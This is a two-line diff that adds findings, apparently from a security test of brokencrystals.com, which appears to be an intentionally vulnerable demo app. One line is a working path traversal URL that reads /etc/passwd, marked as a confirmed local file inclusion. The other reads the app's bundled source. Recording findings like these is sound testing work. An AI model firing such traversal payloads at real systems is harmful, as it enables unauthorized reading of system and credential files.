@@ -1,0 +1,2 @@
+https://brokencrystals.com/api/file?path=../../../etc/passwd&type=text [CONFIRMED LFI - arbitrary file read]
+https://brokencrystals.com/api/file?path=dist/main.js&type=text [CONFIRMED - app source readable]
